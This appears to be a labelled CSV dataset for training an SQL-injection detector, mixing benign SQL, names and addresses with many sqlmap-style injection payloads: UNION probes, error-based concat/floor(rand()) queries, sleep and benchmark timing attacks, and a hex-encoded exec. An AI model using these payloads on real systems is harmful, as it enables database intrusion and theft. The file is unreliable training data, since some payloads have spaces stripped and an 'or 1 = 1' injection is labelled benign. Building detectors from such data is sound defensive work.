Query,Label
1'	)	))	and 2853	 =cast		(  	( 	chr (	113	) ||chr(		113) ||chr(112 )||chr (		106 	)		||chr	(113	  )	)||  ( select  ( casewhen 	(	2853 	= 2853	) then 1	else0end)		) 	 ::text||	 (	chr	( 113	 )	||chr		( 122	) 	||chr(118 )||chr ( 122)	||chr	(  113	 ) 	)as numeric	) and(	(		(	'gegg'	= 'gegg,1
357,0
"1		)	 ))  union	all	selectnull,null,null,null,null,null,null,null--",1
SELECT ill ( s )  FROM cost SELECT leader ( s ),0
SELECT * FROM  ( SELECT minute FROM excitement ),0
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,0
"1%"" or  ( select	9173 from  ( 	selectcount(*)	,concat	( 0x7171706a71,(select (		elt  (		9173 =	9173,1  )) 	 )	,0x717a767a71,floor	(rand 	(0)*2 	)		) xfrom information_schema.character_sets group byx	 )	a) and""%""	=	""",1
SELECT * FROM arm WHERE tongue = 'divide' FETCH FIRST 3 ROWS ONLY,0
"1) 	and3707 = (		selectcount(*	) from sysibm.systablesast1,sysibm.systables as t2,sysibm.systablesast3 )  and  (9509 =9509",1
8.00405E+14,0
"SELECT * FROM call WHERE flight IN  ( 'become', 'who', 'basket' )",0
basta@24htranslations.edu,0
"-4849"" 	 )  ) or   (5005= 9111 )*9111and 	( 	(  ""catv""like""catv",1
"sol, 153",0
tromba,0
SELECT * FROM potatoes WHERE older BETWEEN '1996-07-01' AND '1996-07-31',0
"1 ) 	where9432	=9432	and 6510	=  ( select count	( * )		fromsysusers as	sys1,sysusers assys2,sysusers as	sys3,sysusers	as	sys4,sysusersassys5,sysusers	as	sys6,sysusers as	sys7 ) --",1
SELECT COUNT ( chamber ) FROM managed,0
pelayos,0
"1%""		)	 ) ) and2716	=		( select	count		( * )	fromsysusersassys1,sysusers as	sys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusers	as	sys6,sysusers	assys7	) --",1
SELECT * FROM center WHERE inch BETWEEN contrast09/01/1996your AND send15/31/1996week,0
"1'	)		 )or (	 select 9173from (select	count	( 	*	) ,concat	(  0x7171706a71, (	select	 (elt(  9173  =9173,1 	 ) )	 	) ,0x717a767a71,floor(	 rand (	0 )	 *2		)		)		xfrom	information_schema.character_sets	group	byx )a	) and		(   (	 'pqxe'like'pqxe",1
1.21588E+15,0
"1' 	)			)		)andchar	 ( 111	)||char(77 )||char(121)||char(	 88		)  	 =	 regexp_substring	(	repeat	(left (	crypt_key( char  ( 	65)	||char( 	69 ) ||char( 	83	 ) ,null),0	) 	,500000000		) 	,null)  and 	 (	( 	( 'xzcr'='xzcr",1
SELECT * FROM chamber WHERE brave  BETWEEN 10 AND 20,0
"1"" 	)	askslqwhere	8669=	8669and	8635  = (select count (	*)	from generate_series ( 1,5000000	 )  	)  --",1
18995930t,0
carablanca,0
"SELECT Orders.hairrID, Employees.ranch, Employees.teacher FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.askID ORDER BY Orders.knifeID",0
"calle barrio carmelo 21,",0
1'in booleanmode	)  and	7756		=  dbms_utility.sqlid_to_sqlhash	( ( chr (113) 	||chr (113	)	 ||chr (  112		) ||chr (	106)||chr(		113)  || ( select		(	casewhen	( 7756  =	 7756)  then1	else 0end	)			fromdual	)	||chr (	 113		)||chr	( 122 )||chr		(	118	) ||chr(122 )	||chr(113  )	  )	  )#,1
duplan,0
"-6253' unionall select	5756,5756,5756,5756,5756,5756,5756,5756,5756,5756#",1
9.74327E+15,0
SELECT * FROM adult WHERE event BETWEEN '1996-07-01' AND '1996-07-31',0
fit irizibar,0
"UPDATE bean SET well =  'replied', City =  'gain' WHERE mathematics =  twice",0
SELECT * FROM  ( SELECT shallow FROM drive ),0
"select pg_sleep(	 5)	and	 (	 (	""%""		=	""",1
"SELECT column_name ( s )  FROM might,birth",0
SELECT AVG ( increase )  FROM president  SELECT SUM ( today ),0
"SELECT unless, applied, expressFROM know WHERE slow  IS NOT NULL",0
"-3979'	in boolean mode )	 union all	select4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",1
"1where8390	=	8390 and	3824 =	benchmark		(  5000000,md5(	0x76555642) 	)	--",1
66750565b,0
SELECT * FROM instrument FETCH FIRST 3 ROWS ONLY,0
"SELECT t.*, tt.*, tr.object_id FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND tr.object_id IN  ( 262310, 262326, 262328 )  ORDER BY t.name ASC",0
"SELECT column_name ( s )  FROM pound,bet",0
UPDATE block SET village = 'pleasure'WHERE knowledge = 'during',0
vlez acejas,0
"1' )		)			asjntr	where5051  =5051	and(select9067from	(	select count		(*),concat( 0x7171706a71,( select 	(  elt(	9067=	9067,1)	 )		),0x717a767a71,floor (rand(0	)	 *2 ) 	 )		xfrominformation_schema.character_setsgroupbyx)a ) --",1
1'+	(select'cwta'where6091 =6091,1
SELECT * FROM fact WHERE brown BETWEEN '1996-07-01' AND '1996-07-31',0
"1%"" )	 procedure analyse (extractvalue ( 5840,concat(	0x5c,0x7171706a71,	 ( select  	(casewhen	( 5840  =	5840	 )		then 1else0end ))	 ,0x717a767a71 ) )		 ,1	)and		(""%"" 	= """,1
"1"")	 where 8571= 8571and	elt ( 	4249	=4249,7259	 )--",1
SELECT * FROM age ORDER BY thumb,0
SELECT TOP 3 * FROM race,0
3.52714E+15,0
"1"" 	) 	)		 ) andsleep (	5 )	and (		 	(			(  ""fdvc""like	""fdvc",1
dean,0
SELECT volume ( s )  FROM wealth LEFT JOIN,0
"1'  ) 	)	 )  and	8407 = 		(	selectcount	(		* 	)	 fromgenerate_series ( 	1,5000000		) 	 )  and ( 	(	 (		'qgrt'= 'qgrt",1
"-1015""	 )	 		)  	unionall select6624,6624#",1
SELECT diagram ( s FROM actual RIGHT JOIN,0
levisky,0
FROM  ( SELECT DISTINCT down FROM far ),0
SELECT COUNT ( DISTINCT share )  FROM warm,0
SELECT * FROM club FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM rocket,0
"1"" union	allselect	null,null,null--",1
SELECT * FROM earth WHERE duty = 'sign'  AND City = 'loose',0
SELECT * FROM nothing WHERE milk BETWEEN '1996-07-01' AND '1996-07-31',0
pechur@spainbareback.fm,0
gladiolos 30,0
3.45448E+15,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 7074 )  ORDER BY meta_id ASC",0
"1""  ( 	select( casewhen  (4587 =  4587)	thenregexp_substring		(	repeat (left( crypt_key 	(char	(	65	) ||char(69	)		||char(	83	)	,null	),0 ) ,500000000  ),null )elsechar (	76 ) 	||char ( 65	)	||char(102	)||char (  72) end	 )	 from ( values (		0	  )	 	)			)",1
1' )	asscnn	where	9274		=9274,1
1%' )			and7533		= 7533and ('%'	= ',1
"( select *from	( select(sleep (	5	 ) 	) 	 )  srmq  ) and ""%"" =	""",1
"1"")   )	)			and 9198 = 9198--",1
esplendoroso,0
SELECT * FROM across FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM reason,0
SELECT * FROM forth WHERE wish BETWEEN '1996-07-01' AND '1996-07-31',0
"SELECT * FROM political ORDER BY main, practical",0
SELECT shape ( s )  FROM jet FULL OUTER JOIN,0
otorgamiento,0
SELECT AVG ( Price ) FROM pure,0
2300,0
SELECT COUNT ( DISTINCT society )  FROM paint,0
"1'	inbooleanmode )	union	all	select	null,null,null,null,null,null,null,null,null,null--",1
"-2453"" )	unionallselect	4520,4520,4520,4520,4520,4520,4520,4520,4520,4520--",1
-5585%'  ) 		)   )		 or	6990=		7727,1
9.16169E+15,0
"iif(	3760 =	4785,1,1/0)",1
* (| (objectclass= *) 	 ),1
"SELECT * FROM plan WHERE almost NOT IN  ( 'am', 'alike', 'particularly' )",0
SELECT AVG ( native )  FROM personal  SELECT SUM ( shall ),0
"pasaje santo angel, 190,",0
kara-lyn,0
85802086b,0
"1%' ) 		)union	all select null,null--",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 29420 )  ORDER BY meta_id ASC",0
SELECT COUNT ( DISTINCT end )  FROM doctor,0
"1'		)		asljpy where8270 = 8270or(	select	9173 from	( 	selectcount (	 *	) ,concat	( 	0x7171706a71, 	(	 select(elt (  9173	=	9173,1 )	 )		),0x717a767a71,floor	 (  rand		( 	0) *2		)  )	x frominformation_schema.character_setsgroupbyx  ) a) 	--",1
"-2979' 	)	)  asklou where	7092 	=		7092unionallselect7092,7092--",1
1' where	6583	=6583,1
"calle jose canovas pujante, 106 8g",0
SELECT * FROM  ( SELECT appropriate FROM work ),0
93tip72ar,0
SELECT * FROM liquid WHERE sick NOT BETWEEN 'easy' AND 'next',0
SELECT waste ( s )  FROM direct SELECT putting ( s ),0
quintanilla del coco,0
linas,0
8739,0
chlud_kumvongse@encuentrodominios.sd,0
"c/ zilbetiko monasterioaren, s/n,",0
"INSERT INTO weight  ( remain, select, distant )  VALUES  ( 'shut', 'create', 'tribe' )",0
3046,0
SELECT * FROM cold WHERE fireplace = 'bread',0
"SELECT fix AS past, morning AS [recognize]  FROM tape",0
rapetto picabea,0
"1',  ( select(	casewhen ( 5154= 5154  )	 then1else5154*	(select5154frommaster..sysdatabases) end	 )		 )",1
"1	)	as	tkkn where7832 =	7832	  (	select 	( casewhen	(		4587=	4587 	) thenregexp_substring (	repeat		( left(	crypt_key (	char(	65 )	||char ( 69  )	||char(	83		)  ,null	),0		) ,500000000 ) ,null  ) 	else	char		( 76  ) ||char (65		)	||char	(	102	) ||char (	72	 )end	)	from	 ( values ( 0)	) 	 ) --",1
"1"" )  where 2445  =	 2445",1
"-6519'	)		) 	 astdlt where5040 =5040 or	1570 =	convert	(	int,(	select char	(	113	 )	+char ( 	113	)	+char( 	112	)+char		(	106	 )	+char ( 113		) +		( select(	casewhen 	(	 1570	=		1570 )		 then char	 (	49)  elsechar(48	 ) 	end	)		)  +char (		113 )	+char		(122	) +char	 ( 118		) +char	 (122 )  +char ( 	113)	 )  )	--",1
SELECT TOP 50 PERCENT * FROM distance SELECT * FROM effort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM measure,0
"SELECT SUBTIME ( ""10:24:21"", ""300"" ) ;",0
select (	case when (2056 =		1917	 )	then2056	else 1/	( select	0	)	end)--,1
select (  case	when 	(	 3537	= 5218 )  then3537	else3537*  ( select	3537from mysql.db )	end)	 #,1
amorebieta-etxano,0
4.38114E+15,0
82452687x,0
c/ auroros 173,0
SELECT MIN ( cannot )  AS herd FROM drew,0
selectcasewhen	1238= 	9044then1else nullend--,1
ges,0
"1""	)	 )	 and	4241 =convert( int,(selectchar(113	 )+char ( 113	) +char(	112	) +char (	106 ) +char  ( 113	 )	+(	select	(casewhen		 ( 4241=4241	 )	then	char  (	49 )		elsechar	(48	 )  end		)	) +char	(  113  )	+char( 122)	+char	(	118 )	+char( 	122	)	 +char	(113  )		)	 ) 	and ( 	(  ""fkip""	= ""fkip",1
"1'	)		)  	or	8514 =benchmark	( 5000000,md5	 (	0x544d5a4c )   )		#",1
SELECT * FROM order WHERE but = 'piano' LIMIT 3,0
SELECT * FROM fed WHERE speech NOT LIKE 'forgot%',0
SELECT COUNT ( him ) FROM doing,0
1'and1	= ( select count (	*)	from	tablenames	) ;	--,1
"1'	and  (	select 2* 	(		if  ( ( 	 select*from	 (selectconcat	( 	0x7171706a71, ( select(	elt		(	3484	= 3484,1	)			 ) 		) 	,0x717a767a71,0x78	 )			)	 s	 ) , 8446744073709551610,8446744073709551610	 )		) 		)		 and 'tmwy'  =	'tmwy",1
SELECT TOP 50 PERCENT * FROM across,0
cimorro,0
valdeganga,0
2366,0
SELECT COUNT ( particular ) FROM kitchen,0
SELECT COUNT ( DISTINCT equal )  FROM baseball,0
695,0
6769,0
SELECT * FROM straw WHERE officer BETWEEN official09/01/1996since AND getting15/31/1996fell,0
"waitfordelay'0:0:5'and	( ""%""	=""",1
SELECT tired ( s )  FROM barn UNION ALL,0
"1"" 	)   )	 and 4241	=	convert	 (		int,(	selectchar ( 113 	) +char	(113)+char	 ( 112 	)+char (		106	)		+char  ( 113 )	 + (	select( case	when	 (4241	= 	4241	) 	thenchar	 ( 49  )		else char	( 48 	)	 end  	)	 )+char	(	113)+char(122  )	+char 	(118		) 	+char(  122		) +char(113))	 		) 	and 	  (		( ""bxcb""like""bxcb",1
SELECT accurate ( s )  FROM huge FULL OUTER JOIN,0
1' )		 )  )	 and	7533		= 	7533 and	( 	( 		 (	'suzd' like	'suzd,1
"SELECT * FROM garage WHERE exactly IN  ( 'above', 'shut', 'becoming' )",0
"SELECT Employees.broken, COUNT ( Orders.populationID )  AS actFROM    ( OrdersINNER JOIN mood ON Orders.locateID  =  Employees.dutyID )",0
"SELECT UserId, Name, PasswordFROM Users WHERE UserId  =  105 or 1 = 1;",0
SELECT * FROM tin WHERE row NOT LIKE '[supper]%',0
2946,0
SELECT * FROM per WHERE paid NOT LIKE 'ants%',0
bowman pinela,0
"1%""union all selectnull,null,null,null,null#",1
SELECT TOP 3 * FROM copy WHERE out = 'cheese',0
"molinos, los",0
karin,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 513 )  ORDER BY meta_id ASC",0
"-3856"" )  as iyzlwhere7394	=7394or1570	=	convert  (	int,	 ( 	selectchar	(	 113	)	+char(	 113)  +char (		112 )	+char(	106)	 +char( 113)+(	select	 (casewhen	(1570=		1570  )		then	char( 49		)		elsechar( 48	 )end ) ) +char(		113	)	+char	(	122)+char	(  118	)  +char (	122 ) 	+char (	113 )  )	 ) --",1
6.02828E+15,0
SELECT * FROM bite WHERE dish NOT LIKE '[policeman]%',0
"1""  )	 as	xwnuwhere6490	=	6490unionallselect null,null,null,null,null,null--",1
92793320g,0
SELECT * FROM either FETCH FIRST 50 PERCENT ROWS ONLY,0
espls,0
"1') )	  ) or	8421	=		(	select count  (		* )	fromgenerate_series  ( 	1,5000000 	)	 )	  and 	( (	(	'tfnb'	 =	'tfnb",1
76591879q,0
"-4543"" 	)	or	3038=	 3038",1
1'+( select 'gmpn'where	8137 =  8137orsleep(5 		)			)		+',1
"1'	) 	where9842= 9842	unionallselect	null,null,null,null,null,null,null,null#",1
SELECT * FROM Customers  WHERE CustomerName LIKE '%or%';,0
"1'	 )  or	2367  =	(	select	count	( 	*	 )from rdb$fields	as t1,rdb$typesas	t2,rdb$collationsast3,rdb$functions	as t4		) --",1
SELECT * FROM radio  WHERE means = suppose,0
4.80387E+15,0
SELECT * FROM machinery WHERE choice = 'plan',0
"-1333"" ) 	)	 	unionallselect2376,2376,2376,2376,2376,2376,2376,2376,2376--",1
"-3059 or	1570	=convert	(	int, 	(select char (  113	)	+char	 (	113	) +char (	112 )		+char		(	106)	+char (	113	 )+  ( 	select (case	when (	1570		=  1570 	)	then char	(	49	)	 elsechar 	(	 48 	)	end			)		)	 +char 	(	113	)	+char 	( 122 )	+char(118	) +char (	122		)+char ( 113	)	)	  )",1
5i852469,0
"UPDATE shells SET college =  'part', City =  'valuable' WHERE his =  triangle",0
select 	 (	case when( 6434	= 	3877 	)then6434else1/ 	(	select 0  ) end	)	 --,1
select(case	when		(3486	= 	6373 	)	 then	3486else	3486*(	select 3486frommysql.db		)		end	) #,1
"SELECT * FROM research WHERE till NOT IN  ( 'production', 'winter', 'burst' )",0
SELECT Count ( * )  AS blank,0
SELECT * FROM everyone FETCH FIRST 50 PERCENT ROWS ONLY,0
"1', 	(convert  (int,(select	char	(  113 	)+char ( 113 	) 	+char	(112	)+char	( 106 )+char	(	113)  +  ( select	( case	when(	4932  =	4932 )then	char	(  49 )  elsechar (	48		)	 end	)) 		+char (	113	)	+char 	(	122	) +char	(	 118)  +char (122	) +char	(	113 )	 )			)	)",1
"1"" where9521	= 	9521or	(select* from ( select		(	 sleep ( 5	) ) )ydpu	) --",1
"SELECT * FROM doctor WHERE adventure IN  ( 'stuck', 'pull', 'title' )",0
de78e24423n6e,0
67663365x,0
roda deita,0
declare	@qnvarchar (200)  select	@q		= 	0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec	(	@q	),1
"select*fromuserswhere	id= '1'unionselect $.,@@VERSION--1'",1
"calle tarragona, 185 11g",0
SELECT * FROM attention WHERE effort = 'does'  OR everything = 'allow',0
"vendrell, el",0
"1""	or (select9173from ( select	count		( * 	) ,concat(0x7171706a71,(		select		( elt	 (9173 	=	 9173,1  )  	) 			) ,0x717a767a71,floor(		rand	( 	0	)	*2		))  xfrominformation_schema.character_sets	groupbyx 	)	a )",1
